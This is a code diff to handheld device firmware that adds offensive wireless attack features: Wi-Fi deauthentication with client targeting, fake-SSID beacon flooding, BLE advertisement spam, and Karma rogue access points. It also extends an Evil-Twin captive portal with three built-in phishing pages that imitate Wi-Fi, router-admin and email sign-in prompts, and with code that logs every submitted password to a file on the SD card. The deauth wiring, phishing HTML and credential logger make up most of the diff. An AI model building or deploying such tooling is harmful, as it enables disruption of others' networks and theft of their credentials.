@@ -23,6 +23,10 @@
 #include "localserve.h"
 #include "usb_net.h"
 #include "sniffer.h"
+#include "deauther.h"
+#include "beacon.h"
+#include "blespam.h"
+#include "karma.h"
 
 // ---------- Palette (cyberdeck terminal) ----------
 static M5GFX display;
@@ -186,7 +190,7 @@ struct Menu {
 
 // ---------- App views ----------
 enum AppView { VIEW_MENU, VIEW_MSG, VIEW_KB, VIEW_MOUSE, VIEW_PAD, VIEW_FILES,
-                VIEW_FILEACT, VIEW_TEXTIN, VIEW_CONFIRM, VIEW_DUCK, VIEW_DUCKRUN, VIEW_WIFISCAN, VIEW_WIFISTAT, VIEW_HOTSPOT, VIEW_CAPPICK, VIEW_CAPTIVE, VIEW_SNIFF };
+                VIEW_FILEACT, VIEW_TEXTIN, VIEW_CONFIRM, VIEW_DUCK, VIEW_DUCKRUN, VIEW_WIFISCAN, VIEW_WIFISTAT, VIEW_HOTSPOT, VIEW_CAPPICK, VIEW_CAPTIVE, VIEW_SNIFF, VIEW_STAPICK, VIEW_DEAUTH, VIEW_BLESPAM, VIEW_BEACON, VIEW_KARMA };
 static AppView g_view = VIEW_MENU;
 static Menu* g_anim_menu = NULL;
 static TickType_t g_anim_start = 0;
@@ -328,6 +332,16 @@ static bool        g_wifi_connected = false;
 static int         g_wifi_inet = -1;   // -1 unknown, 0 no, 1 yes
 static bool        g_serve_mode = false;  // true = this WiFi session is a LocalServe host
 static bool        g_evil_mode  = false;  // true = scan pick clones SSID into the open AP (Evil-Twin)
+static bool        g_deauth_mode = false; // true = scan pick becomes the deauth target
+// Deauth target AP + station picker state (clients discovered on the AP channel).
+#define STA_SEL_MAX 32
+static uint8_t     g_deauth_bssid[6];
+static uint8_t     g_deauth_chan = 0;
+static char        g_deauth_ssid[33] = {0};
+static bool        g_sta_sel[STA_SEL_MAX] = {0}; // per-station checkbox
+static bool        g_sta_all = true;             // row 0 = ALL (broadcast)
+static int         g_sta_cur = 0;                // highlighted row (0 = ALL)
+static int         g_sta_top = 0;
 static char        g_cap_name[WIFI_SSID_MAX];
 static char*       g_cap_html = 0;
 static int         g_cap_html_len = 0;
@@ -545,6 +559,38 @@ static void act_eviltwin() {
   g_view = VIEW_WIFISCAN;
   wifi_scan_now();
 }
+static void act_deauth() {
+  if (!wifi_net_running() || !g_aps) {
+    show_msg("DEAUTH", "WiFi not ready.\nLeave and re-enter\nthe WiFi menu.");
+    return;
+  }
+  // Scan, then the picked network becomes the deauth target.
+  g_serve_mode  = false;
+  g_evil_mode   = false;
+  g_deauth_mode = true;
+  g_view = VIEW_WIFISCAN;
+  wifi_scan_now();
+}
+static void act_beacon() {
+  if (!wifi_net_running()) {
+    show_msg("BEACON", "WiFi not ready.\nLeave and re-enter\nthe WiFi menu.");
+    return;
+  }
+  if (!beacon_start()) { show_msg("BEACON", "Beacon start\nfailed."); return; }
+  g_view = VIEW_BEACON;
+}
+static void act_blespam() {
+  if (!blespam_start(BLESPAM_ALL)) { show_msg("BLE SPAM", "BLE spam start\nfailed."); return; }
+  g_view = VIEW_BLESPAM;
+}
+static void act_karma() {
+  if (!wifi_net_running()) {
+    show_msg("KARMA", "WiFi not ready.\nLeave and re-enter\nthe WiFi menu.");
+    return;
+  }
+  if (!karma_start()) { show_msg("KARMA", "Karma start\nfailed."); return; }
+  g_view = VIEW_KARMA;
+}
 
 // ---------- LocalServe actions ----------
 // Wireless: reuse the WiFi scan/connect flow, then start the file server on the
@@ -607,10 +653,11 @@ static Menu control_menu = { "CONTROL", control_items, 3, 0, 0 };
 static MenuItem ble_items[] = {
   { "Control",      KIND_SUBMENU, &control_menu, 0, 0, 0 },
   { "Duck",         KIND_ACTION,  0, act_ble_duck, 0, 0 },
+  { "BLE Spam",     KIND_ACTION,  0, act_blespam, 0, 0 },
   { "Forget Bonds", KIND_ACTION,  0, act_forget, 0, 0 },
   { "Info",         KIND_ACTION,  0, act_info,   0, 0 },
 };
-static Menu ble_menu = { "BLE", ble_items, 4, 0, 0 };
+static Menu ble_menu = { "BLE", ble_items, 5, 0, 0 };
 
 static MenuItem set_items[] = {
   { "Logging",   KIND_TOGGLE, 0, 0, &g_log_on,  on_log_toggle },
@@ -651,9 +698,12 @@ static MenuItem wifi_items[] = {
   { "Scan",      KIND_ACTION, 0, act_wifi_scan, 0, 0 },
   { "Hotspot",   KIND_ACTION, 0, act_hotspot,   0, 0 },
   { "Evil-Twin", KIND_ACTION, 0, act_eviltwin,  0, 0 },
+  { "Deauth",    KIND_ACTION, 0, act_deauth,    0, 0 },
+  { "Beacon",    KIND_ACTION, 0, act_beacon,    0, 0 },
+  { "Karma",     KIND_ACTION, 0, act_karma,     0, 0 },
   { "Free Heap", KIND_ACTION, 0, act_wifi_heap, 0, 0 },
 };
-static Menu wifi_menu = { "WIFI", wifi_items, 4, 0, 0 };
+static Menu wifi_menu = { "WIFI", wifi_items, 7, 0, 0 };
 
 // LocalServe: host a static multi-site tree off the microSD over the network.
 // Wireless = join WiFi (STA); Wired = USB-NCM without starting WiFi.
@@ -1030,6 +1080,10 @@ static void sync_radios() {
   if (!nu && was_usb) uhid_stop();
   was_ble = nb;
   was_usb = nu;
+  static bool was_bs = false;        // stop BLE spam when the BLE subtree is left
+  bool nbs = stack_has(&ble_menu);
+  if (!nbs && was_bs) blespam_stop();
+  was_bs = nbs;
 }
 
 // Storage mirrors the radios: mount the SD (and grab the entry buffer) when the
@@ -1060,6 +1114,10 @@ static void sync_wifi() {
       g_aps = (wifi_ap_t*)malloc(sizeof(wifi_ap_t) * WIFI_MAX_AP);
   }
   if (!now && was) {
+    deauther_stop();     // no-op if not transmitting
+    beacon_stop();       // no-op if not transmitting
+    karma_stop();        // no-op if not running
+    stationscan_stop();  // no-op if not scanning
     cap_stop();          // no-op if portal not running
     cap_cleanup_sd();
     if (g_aps) { free(g_aps); g_aps = 0; }
@@ -2007,6 +2065,20 @@ static void tick_wifiscan() {
     case '/': case '\n': case '\r': {
       if (g_ap_count == 0) break;
       wifi_ap_t* a = &g_aps[g_ap_sel];
+      if (g_deauth_mode) {
+        // Remember the target AP, then discover its clients on its channel.
+        memcpy(g_deauth_bssid, a->bssid, 6);
+        g_deauth_chan = a->channel;
+        strncpy(g_deauth_ssid, a->ssid, sizeof(g_deauth_ssid) - 1);
+        g_deauth_ssid[sizeof(g_deauth_ssid) - 1] = 0;
+        g_deauth_mode = false;
+        g_sta_all = true;
+        g_sta_cur = 0; g_sta_top = 0;
+        memset(g_sta_sel, 0, sizeof(g_sta_sel));
+        stationscan_start(g_deauth_bssid, g_deauth_chan);
+        g_view = VIEW_STAPICK;
+        break;
+      }
       if (g_evil_mode) {
         // Clone the picked SSID into the open AP name, then pick the page.
         strncpy(g_cap_name, a->ssid, sizeof(g_cap_name) - 1);
@@ -2024,6 +2096,7 @@ static void tick_wifiscan() {
     }
     case ',': case '`':
       g_evil_mode = false;
+      g_deauth_mode = false;
       leave_screen();
       break;
     default: break;
@@ -2182,6 +2255,224 @@ static void tick_sniff() {
   if (k == ',' || k == '`') { g_view = VIEW_MENU; g_last = k; }
 }
 
+// Station picker: choose ALL (broadcast) or check specific discovered clients.
+// The scanner parks on the AP channel and fills the list live.
+static void draw_stapick() {
+  canvas.fillSprite(C_BG);
+  int n = stationscan_count();
+  char title[28];
+  snprintf(title, sizeof(title), "Clients (%d)", n);
+  draw_statusbar(title);
+  canvas.setFont(&fonts::Font2);
+  int total = n + 1;                        // row 0 = ALL
+  if (g_sta_cur >= total) g_sta_cur = total - 1;
+  if (g_sta_cur < 0) g_sta_cur = 0;
+  if (g_sta_cur < g_sta_top) g_sta_top = g_sta_cur;
+  if (g_sta_cur >= g_sta_top + VIS) g_sta_top = g_sta_cur - VIS + 1;
+  char l[48];
+  for (int r = 0; r < VIS && g_sta_top + r < total; r++) {
+    int idx = g_sta_top + r;
+    int y = LIST_Y + r * ROW_H;
+    bool sel = (idx == g_sta_cur);
+    if (sel) canvas.fillRoundRect(4, y, W - 8, ROW_H - 2, 3, C_SELBG);
+    uint16_t bg = sel ? C_SELBG : C_BG;
+    canvas.setTextDatum(textdatum_t::top_left);
+    if (idx == 0) {
+      canvas.setTextColor(C_AMBER, bg);
+      snprintf(l, sizeof(l), "[%c] ALL (broadcast)", g_sta_all ? 'x' : ' ');
+      canvas.drawString(l, 10, y + 3);
+    } else {
+      int si = idx - 1;
+      uint8_t mac[6]; int8_t rssi = 0; uint32_t pk = 0;
+      if (!stationscan_get(si, mac, &rssi, &pk)) continue;
+      canvas.setTextColor(C_TEXT, bg);
+      char vn[20]; mac_label(mac, vn, sizeof(vn));
+      snprintf(l, sizeof(l), "[%c] %s %02X:%02X",
+               (si < STA_SEL_MAX && g_sta_sel[si]) ? 'x' : ' ',
+               vn, mac[4], mac[5]);
+      canvas.drawString(l, 10, y + 3);
+      canvas.setTextColor(C_DIM, bg);
+      snprintf(l, sizeof(l), "%ddBm %u", (int)rssi, (unsigned)pk);
+      canvas.setTextDatum(textdatum_t::top_right);
+      canvas.drawString(l, W - 10, y + 3);
+    }
+  }
+  canvas.setTextDatum(textdatum_t::bottom_left);
+  canvas.setTextColor(C_DIM, C_BG);
+  canvas.drawString("ret pick  d start  , back", 8, H - 2);
+  canvas.pushSprite(LMARGIN, 0);
+}
+static void tick_stapick() {
+  char k = kb_poll();
+  if (!k) return;
+  int n = stationscan_count();
+  int total = n + 1;
+  switch (k) {
+    case ';': if (g_sta_cur > 0) { g_sta_cur--; g_ui_dirty = true; } break;
+    case '.': if (g_sta_cur < total - 1) { g_sta_cur++; g_ui_dirty = true; } break;
+    case '/': case '\n': case '\r': case ' ':
+      if (g_sta_cur == 0) g_sta_all = !g_sta_all;
+      else {
+        int si = g_sta_cur - 1;
+        if (si < STA_SEL_MAX) { g_sta_sel[si] = !g_sta_sel[si]; g_sta_all = false; }
+      }
+      g_ui_dirty = true;
+      break;
+    case 'd': case 'D': {
+      static uint8_t tgts[STA_SEL_MAX][6];
+      int cnt = 0;
+      if (!g_sta_all) {
+        for (int si = 0; si < n && si < STA_SEL_MAX; si++) {
+          if (!g_sta_sel[si]) continue;
+          uint8_t mac[6];
+          if (stationscan_get(si, mac, 0, 0)) { memcpy(tgts[cnt], mac, 6); cnt++; }
+        }
+      }
+      stationscan_stop();
+      deauther_start_targets(g_deauth_bssid, g_deauth_chan, cnt ? tgts : 0, cnt);
+      g_view = VIEW_DEAUTH;
+      break;
+    }
+    case 'r': case 'R':
+      stationscan_start(g_deauth_bssid, g_deauth_chan);  // clear + restart
+      memset(g_sta_sel, 0, sizeof(g_sta_sel));
+      g_sta_cur = 0; g_sta_top = 0;
+      g_ui_dirty = true;
+      break;
+    case ',': case '`':
+      stationscan_stop();
+      g_deauth_mode = true;        // re-arm so re-picking an AP works
+      g_view = VIEW_WIFISCAN;
+      g_ui_dirty = true;
+      break;
+    default: break;
+  }
+}
+
+// Deauth: live view while deauth/disassoc bursts are transmitted at the target.
+static void draw_deauth() {
+  canvas.fillSprite(C_BG);
+  draw_statusbar("Deauth ON");
+  canvas.setFont(&fonts::Font2);
+  canvas.setTextDatum(textdatum_t::top_left);
+  int y = LIST_Y;
+  char l[80];
+  const uint8_t* b = deauther_bssid();
+  canvas.setTextColor(C_ACCENT, C_BG);
+  snprintf(l, sizeof(l), "AP %02X:%02X:%02X:%02X:%02X:%02X",
+           b[0], b[1], b[2], b[3], b[4], b[5]);
+  canvas.drawString(l, 10, y);
+  int nt = deauther_target_count();
+  if (nt == 0) snprintf(l, sizeof(l), "ch %u   broadcast (all)", (unsigned)deauther_channel());
+  else         snprintf(l, sizeof(l), "ch %u   targets %d", (unsigned)deauther_channel(), nt);
+  canvas.drawString(l, 10, y + 18);
+  canvas.setTextColor(C_TEXT, C_BG);
+  snprintf(l, sizeof(l), "frames sent  %u", (unsigned)deauther_sent());
+  canvas.drawString(l, 10, y + 42);
+  canvas.setTextColor(C_DIM, C_BG);
+  canvas.drawString(deauther_running() ? "transmitting..." : "stopped", 10, y + 60);
+  canvas.setTextDatum(textdatum_t::bottom_left);
+  canvas.setTextColor(C_DIM, C_BG);
+  canvas.drawString("d stop   , back", 8, H - 2);
+  canvas.pushSprite(LMARGIN, 0);
+}
+static void tick_deauth() {
+  char k = kb_poll();
+  if (!k) return;
+  if (k == 'd' || k == 'D') { deauther_stop(); g_ui_dirty = true; return; }
+  if (k == ',' || k == '`') { deauther_stop(); g_view = VIEW_MENU; g_last = k; }
+}
+
+static void draw_blespam() {
+  canvas.fillSprite(C_BG);
+  draw_statusbar("BLE Spam ON");
+  canvas.setFont(&fonts::Font2);
+  canvas.setTextDatum(textdatum_t::top_left);
+  int y = LIST_Y;
+  char l[80];
+  canvas.setTextColor(C_ACCENT, C_BG);
+  canvas.drawString("Apple + MS + Google", 10, y);
+  canvas.setTextColor(C_TEXT, C_BG);
+  snprintf(l, sizeof(l), "adverts sent  %u", (unsigned)blespam_sent());
+  canvas.drawString(l, 10, y + 24);
+  canvas.setTextColor(C_DIM, C_BG);
+  canvas.drawString(blespam_running() ? "broadcasting..." : "stopped", 10, y + 48);
+  canvas.setTextDatum(textdatum_t::bottom_left);
+  canvas.setTextColor(C_DIM, C_BG);
+  canvas.drawString("d stop   , back", 8, H - 2);
+  canvas.pushSprite(LMARGIN, 0);
+}
+static void tick_blespam() {
+  char k = kb_poll();
+  if (!k) return;
+  if (k == 'd' || k == 'D') { blespam_stop(); g_ui_dirty = true; return; }
+  if (k == ',' || k == '`') { blespam_stop(); g_view = VIEW_MENU; g_last = k; }
+}
+
+static void draw_beacon() {
+  canvas.fillSprite(C_BG);
+  draw_statusbar("Beacon ON");
+  canvas.setFont(&fonts::Font2);
+  canvas.setTextDatum(textdatum_t::top_left);
+  int y = LIST_Y;
+  char l[80];
+  canvas.setTextColor(C_ACCENT, C_BG);
+  snprintf(l, sizeof(l), "%d fake SSIDs", beacon_count());
+  canvas.drawString(l, 10, y);
+  canvas.setTextColor(C_TEXT, C_BG);
+  snprintf(l, sizeof(l), "beacons sent  %u", (unsigned)beacon_sent());
+  canvas.drawString(l, 10, y + 24);
+  snprintf(l, sizeof(l), "channel  %u", (unsigned)beacon_channel());
+  canvas.setTextColor(C_DIM, C_BG);
+  canvas.drawString(l, 10, y + 48);
+  canvas.drawString(beacon_running() ? "transmitting..." : "stopped", 10, y + 66);
+  canvas.setTextDatum(textdatum_t::bottom_left);
+  canvas.setTextColor(C_DIM, C_BG);
+  canvas.drawString("d stop   , back", 8, H - 2);
+  canvas.pushSprite(LMARGIN, 0);
+}
+static void tick_beacon() {
+  char k = kb_poll();
+  if (!k) return;
+  if (k == 'd' || k == 'D') { beacon_stop(); g_ui_dirty = true; return; }
+  if (k == ',' || k == '`') { beacon_stop(); g_view = VIEW_MENU; g_last = k; }
+}
+
+static void draw_karma() {
+  canvas.fillSprite(C_BG);
+  draw_statusbar("Karma ON");
+  canvas.setFont(&fonts::Font2);
+  canvas.setTextDatum(textdatum_t::top_left);
+  int y = LIST_Y;
+  char l[64];
+  canvas.setTextColor(C_ACCENT, C_BG);
+  snprintf(l, sizeof(l), "harvested  %d", karma_ssid_count());
+  canvas.drawString(l, 10, y);
+  canvas.setTextColor(C_DIM, C_BG);
+  snprintf(l, sizeof(l), "sent %u   ch %u", (unsigned)karma_sent(), (unsigned)karma_channel());
+  canvas.drawString(l, 10, y + 18);
+  int n = karma_ssid_count();
+  int rows = (H - 2 - (y + 40)) / 16;
+  if (rows > 6) rows = 6;
+  int start = n > rows ? n - rows : 0;   // show the most recent
+  canvas.setTextColor(C_TEXT, C_BG);
+  for (int i = 0; i < rows && start + i < n; i++) {
+    char s[40];
+    if (karma_ssid(start + i, s, sizeof(s)))
+      canvas.drawString(s, 10, y + 40 + i * 16);
+  }
+  canvas.setTextDatum(textdatum_t::bottom_left);
+  canvas.setTextColor(C_DIM, C_BG);
+  canvas.drawString("d stop   , back", 8, H - 2);
+  canvas.pushSprite(LMARGIN, 0);
+}
+static void tick_karma() {
+  char k = kb_poll();
+  if (!k) return;
+  if (k == 'd' || k == 'D') { karma_stop(); g_ui_dirty = true; return; }
+  if (k == ',' || k == '`') { karma_stop(); g_view = VIEW_MENU; g_last = k; }
+}
+
 // ======================= CAPTIVE PORTAL =======================
 #define CAP_MAX      64
 #define CAP_HTML_MAX 24576
@@ -2189,6 +2480,55 @@ static void tick_sniff() {
 static sd_entry_t* g_cap = 0;
 static int  g_cap_count = 0, g_cap_sel = 0, g_cap_top = 0;
 static bool g_cap_sd = false;
+static int  g_cred_seq = 0;
+#define CRED_LOG CAPTIVE_ROOT "/creds.log"
+
+// Built-in phishing page templates, dropped onto the SD by "g" in the page
+// picker so the portal has something to serve. Each form POSTs to "/"; the
+// POST handler captures the raw body regardless of field names.
+static const char* const CAP_TPL_NAME[] = { "wifi.html", "router.html", "signin.html" };
+static const char* const CAP_TPL_HTML[] = {
+  // wifi.html -- "network password required"
+  "<!doctype html><html><head><meta charset=utf-8>"
+  "<meta name=viewport content=\"width=device-width,initial-scale=1\"><title>WiFi Login</title></head>"
+  "<body style=\"font-family:sans-serif;max-width:360px;margin:40px auto;padding:0 16px\">"
+  "<h2>Network Login</h2><p>This network is protected. Enter the WiFi password to connect.</p>"
+  "<form method=POST action=/>"
+  "<p><input name=password type=password placeholder=\"WiFi password\" style=\"width:100%;padding:10px;font-size:16px;box-sizing:border-box\"></p>"
+  "<p><button style=\"width:100%;padding:12px;font-size:16px\">Connect</button></p>"
+  "</form></body></html>",
+  // router.html -- "router admin / firmware update"
+  "<!doctype html><html><head><meta charset=utf-8>"
+  "<meta name=viewport content=\"width=device-width,initial-scale=1\"><title>Router Admin</title></head>"
+  "<body style=\"font-family:sans-serif;max-width:360px;margin:40px auto;padding:0 16px\">"
+  "<h2>Router Administration</h2><p>A critical firmware update is required. Sign in to continue.</p>"
+  "<form method=POST action=/>"
+  "<p><input name=username placeholder=\"Admin username\" style=\"width:100%;padding:10px;font-size:16px;box-sizing:border-box\"></p>"
+  "<p><input name=password type=password placeholder=\"Admin password\" style=\"width:100%;padding:10px;font-size:16px;box-sizing:border-box\"></p>"
+  "<p><button style=\"width:100%;padding:12px;font-size:16px\">Update now</button></p>"
+  "</form></body></html>",
+  // signin.html -- generic email/password sign-in
+  "<!doctype html><html><head><meta charset=utf-8>"
+  "<meta name=viewport content=\"width=device-width,initial-scale=1\"><title>Sign in</title></head>"
+  "<body style=\"font-family:sans-serif;max-width:360px;margin:40px auto;padding:0 16px\">"
+  "<h2>Sign in</h2><p>Verify your account to access the internet.</p>"
+  "<form method=POST action=/>"
+  "<p><input name=email type=email placeholder=\"Email\" style=\"width:100%;padding:10px;font-size:16px;box-sizing:border-box\"></p>"
+  "<p><input name=password type=password placeholder=\"Password\" style=\"width:100%;padding:10px;font-size:16px;box-sizing:border-box\"></p>"
+  "<p><button style=\"width:100%;padding:12px;font-size:16px\">Continue</button></p>"
+  "</form></body></html>",
+};
+#define CAP_TPL_N ((int)(sizeof(CAP_TPL_NAME) / sizeof(CAP_TPL_NAME[0])))
+
+// Captive-portal POST capture -> append one line per submission to the SD log.
+static void cp_capture(const char* body, const char* ip) {
+  char line[640];
+  int n = snprintf(line, sizeof(line), "#%d ssid=%s ip=%s %s\n",
+                   ++g_cred_seq, g_cap_name, ip ? ip : "?", body ? body : "");
+  if (n < 0) return;
+  if (n >= (int)sizeof(line)) n = (int)sizeof(line) - 1;
+  sd_append_file(CRED_LOG, line, n);
+}
 
 static bool ends_html(const char* n) {
   size_t l = strlen(n);
@@ -2196,9 +2536,20 @@ static bool ends_html(const char* n) {
          (l > 4 && !strcasecmp(n + l - 4, ".htm"));
 }
 
-static void cap_cleanup_sd() {
+static void cap_free_list() {
   if (g_cap) { free(g_cap); g_cap = 0; }
+}
+static void cap_cleanup_sd() {
+  cap_free_list();
   if (g_cap_sd) { sd_unmount(); g_cap_sd = false; }
+}
+static void cap_deploy_templates() {
+  if (!g_cap_sd) return;
+  for (int i = 0; i < CAP_TPL_N; i++) {
+    char p[128];
+    snprintf(p, sizeof(p), CAPTIVE_ROOT "/%s", CAP_TPL_NAME[i]);
+    sd_write_file(p, CAP_TPL_HTML[i], -1);
+  }
 }
 
 static void cap_open_picker() {
@@ -2224,9 +2575,11 @@ static void cap_launch(int idx) {
   if (!g_cap_html) g_cap_html = (char*)malloc(CAP_HTML_MAX);
   if (!g_cap_html) { cap_cleanup_sd(); show_msg("EVIL-TWIN", "Out of memory."); return; }
   int r = sd_read_file(path, g_cap_html, CAP_HTML_MAX);
-  cap_cleanup_sd();                 // page is in RAM now; release SD + list
+  cap_free_list();                  // page is in RAM; keep SD mounted for the cred log
   if (r < 0) { free(g_cap_html); g_cap_html = 0; show_msg("EVIL-TWIN", "Read failed."); return; }
   g_cap_html_len = r;
+  g_cred_seq = 0;
+  wifi_net_cp_set_capture(cp_capture);
   if (!wifi_net_cp_start(g_cap_name, g_cap_html, g_cap_html_len)) {
     free(g_cap_html); g_cap_html = 0;
     show_msg("EVIL-TWIN", "Failed to start\ncaptive portal.");
@@ -2237,8 +2590,10 @@ static void cap_launch(int idx) {
 
 static void cap_stop() {
   wifi_net_cp_stop();          // safe even if portal was never started
+  wifi_net_cp_set_capture(0);
   if (g_cap_html) { free(g_cap_html); g_cap_html = 0; }
   g_cap_html_len = 0;
+  cap_cleanup_sd();            // release the SD held open for the cred log
 }
 
 static void draw_cappick() {
@@ -2249,7 +2604,7 @@ static void draw_cappick() {
     canvas.setTextColor(C_DIM, C_BG);
     canvas.setTextDatum(textdatum_t::top_left);
     canvas.drawString("no pages in " CAPTIVE_ROOT, 12, LIST_Y + 4);
-    canvas.drawString("add .html files", 12, LIST_Y + 26);
+    canvas.drawString("press g: add samples", 12, LIST_Y + 26);
   }
   for (int i = 0; i < VIS; i++) {
     int idx = g_cap_top + i;
@@ -2263,7 +2618,7 @@ static void draw_cappick() {
   }
   canvas.setTextDatum(textdatum_t::bottom_left);
   canvas.setTextColor(C_DIM, C_BG);
-  canvas.drawString("ret start   , back", 8, H - 2);
+  canvas.drawString("ret start  g pages  , back", 8, H - 2);
   canvas.pushSprite(LMARGIN, 0);
 }
 
@@ -2274,6 +2629,7 @@ static void tick_cappick() {
     case ';': if (g_cap_sel > 0) g_cap_sel--; if (g_cap_sel < g_cap_top) g_cap_top = g_cap_sel; break;
     case '.': if (g_cap_sel < g_cap_count - 1) g_cap_sel++; if (g_cap_sel >= g_cap_top + VIS) g_cap_top = g_cap_sel - VIS + 1; break;
     case '/': case '\n': case '\r': if (g_cap_count > 0) cap_launch(g_cap_sel); break;
+    case 'g': case 'G': cap_deploy_templates(); cap_open_picker(); break;
     case ',': case '`': cap_cleanup_sd(); g_view = VIEW_MENU; g_last = k; break;
     default: break;
   }
@@ -2293,6 +2649,8 @@ static void draw_captive() {
   canvas.setTextColor(C_ACCENT, C_BG);
   snprintf(l, sizeof(l), "clients  %d", wifi_net_ap_clients()); canvas.drawString(l, 10, y + 38);
   snprintf(l, sizeof(l), "hits     %d", wifi_net_cp_hits());    canvas.drawString(l, 10, y + 56);
+  canvas.setTextColor(C_AMBER, C_BG);
+  snprintf(l, sizeof(l), "saved    %d", wifi_net_cp_caps());    canvas.drawString(l, 10, y + 74);
   canvas.setTextDatum(textdatum_t::bottom_left);
   canvas.setTextColor(C_DIM, C_BG);
   canvas.drawString("d stop   , back", 8, H - 2);
@@ -2373,7 +2731,10 @@ extern "C" void app_main(void) {
     bool redraw = drawing_view != last_draw_view || batt_tick || temp_tick ||
                   ble_changed || usb_changed;
     if ((drawing_view == VIEW_HOTSPOT || drawing_view == VIEW_CAPTIVE ||
-         drawing_view == VIEW_SNIFF || drawing_view == VIEW_WIFISTAT) &&
+         drawing_view == VIEW_SNIFF || drawing_view == VIEW_WIFISTAT ||
+         drawing_view == VIEW_DEAUTH || drawing_view == VIEW_STAPICK ||
+         drawing_view == VIEW_BLESPAM || drawing_view == VIEW_BEACON ||
+         drawing_view == VIEW_KARMA) &&
         now - last_dynamic_draw >= pdMS_TO_TICKS(1000)) redraw = true;
     switch (g_view) {
       case VIEW_MENU: {
@@ -2430,6 +2791,11 @@ extern "C" void app_main(void) {
       case VIEW_CAPPICK: tick_cappick(); if (g_view == VIEW_CAPPICK && (redraw || g_ui_dirty)) draw_cappick(); break;
       case VIEW_CAPTIVE: tick_captive(); if (g_view == VIEW_CAPTIVE && (redraw || g_ui_dirty)) draw_captive(); break;
       case VIEW_SNIFF: tick_sniff(); if (g_view == VIEW_SNIFF && (redraw || g_ui_dirty)) draw_sniff(); break;
+      case VIEW_STAPICK: tick_stapick(); if (g_view == VIEW_STAPICK && (redraw || g_ui_dirty)) draw_stapick(); break;
+      case VIEW_DEAUTH: tick_deauth(); if (g_view == VIEW_DEAUTH && (redraw || g_ui_dirty)) draw_deauth(); break;
+      case VIEW_BLESPAM: tick_blespam(); if (g_view == VIEW_BLESPAM && (redraw || g_ui_dirty)) draw_blespam(); break;
+      case VIEW_BEACON: tick_beacon(); if (g_view == VIEW_BEACON && (redraw || g_ui_dirty)) draw_beacon(); break;
+      case VIEW_KARMA: tick_karma(); if (g_view == VIEW_KARMA && (redraw || g_ui_dirty)) draw_karma(); break;
       default: break;
     }
     if (redraw || g_ui_dirty) last_dynamic_draw = now;
